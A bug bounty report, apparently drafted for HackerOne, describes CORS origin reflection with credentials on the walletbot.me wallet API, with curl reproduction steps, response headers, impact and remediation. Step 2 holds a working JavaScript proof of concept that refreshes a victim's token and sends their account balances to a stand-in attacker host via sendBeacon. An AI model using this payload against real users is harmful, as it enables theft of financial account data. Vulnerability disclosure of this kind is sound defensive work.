# [POSSIBLE-HIGH] CORS Arbitrary Origin Reflection with Credentials

**Program:** Walt.io (HackerOne)  
**Researcher:** kzspy  
**Severity:** High  
**CVSS Score:** 7.5 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N) — estimated, pending account test  
**CWE:** CWE-942 (Permissive Cross-domain Policy with Untrusted Domains)  
**Status:** [POSSIBLE] — CORS behavior confirmed passively; full exploitation requires authenticated session (needs Telegram account to confirm impact)

---

## Summary

The walletbot.me API reflects arbitrary `Origin` header values in `Access-Control-Allow-Origin` while simultaneously setting `Access-Control-Allow-Credentials: true` on CORS preflight responses. This allows any web page to make authenticated cross-origin requests to the API and read the responses, potentially enabling account takeover via session token theft.

## Steps to Reproduce

### Step 1: Confirm Reflection Behavior

```bash
# Preflight with attacker origin
curl -s "https://walletbot.me/api/v1/wallets/get_address_info/test" \
  -H "Origin: https://attacker.io" \
  -H "Access-Control-Request-Method: GET" \
  -H "Access-Control-Request-Headers: Authorization" \
  -X OPTIONS -I

# Response headers (trimmed):
# HTTP/2 200
# access-control-allow-credentials: true
# access-control-allow-origin: https://attacker.io   ← REFLECTS attacker's origin
# access-control-allow-methods: DELETE, GET, HEAD, OPTIONS, PATCH, POST, PUT
# access-control-allow-headers: Authorization
```

Same behavior confirmed for:
- `/api/v1/users/authorize_by_telegram/` (auth entry point)
- All `/api/v1/*` endpoints

### Step 2: Exploitation (requires victim to be authenticated)

An attacker hosts the following on `https://attacker.io`:

```html
<script>
// Victim visits attacker page while logged into walt.io via browser
fetch("https://walletbot.me/alectryon/public-api/auth-refresh", {
  method: "POST",
  credentials: "include",  // sends victim's refresh_token cookie
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({})
})
.then(r => r.json())
.then(data => {
  // data contains fresh access token
  // Now call authenticated endpoints
  return fetch("https://walletbot.me/api/v1/accounts/", {
    headers: {"Authorization": "Bearer " + data.access_token},
    credentials: "include"
  });
})
.then(r => r.json())
.then(balances => {
  // Send to attacker server
  navigator.sendBeacon("https://attacker.io/log", JSON.stringify(balances));
});
</script>
```

## Impact

If the victim has a valid `refresh_token` cookie (set after Telegram authentication), an attacker page can:
1. Call `POST /alectryon/public-api/auth-refresh` with victim's cookies → get new access token
2. Use access token to read account balances (`GET /api/v1/accounts/`)
3. Read transaction history (`GET /api/v1/transactions/`)
4. Read payment links, giveaways, and other account data
5. Potentially initiate transfers or withdrawals if the access token grants write permissions

## Prerequisites for Exploitation

1. Victim must be authenticated to walt.io via a browser (not just Telegram app)
2. The `refresh_token` cookie must be present in the browser's cookie store
3. Victim must visit attacker-controlled webpage

## Evidence

```
curl -I -s "https://walletbot.me/api/v1/wallets/get_address_info/test" \
  -H "X-HackerOne-Research: kzspy" \
  -H "Origin: https://attacker.io" \
  -H "Access-Control-Request-Method: GET" \
  -H "Access-Control-Request-Headers: Authorization" \
  -X OPTIONS

HTTP/2 200
access-control-allow-credentials: true
access-control-allow-origin: https://attacker.io
access-control-allow-methods: DELETE, GET, HEAD, OPTIONS, PATCH, POST, PUT
access-control-max-age: 600
```

Tested with multiple origins (`https://attacker.io`, `https://malicious.example.org`, `null`, `http://localhost:8080`) — all reflected verbatim.

## Remediation

1. Replace origin reflection with an allowlist: only allow `https://walletbot.me` and `https://web.telegram.org`
2. If user-supplied origins must be allowed for some reason, validate against the allowlist before reflecting
3. Review whether `Access-Control-Allow-Credentials: true` is needed for all endpoints

---
*Testing conducted manually on 2026-10-08. Header `X-HackerOne-Research: kzspy` included on all requests.*
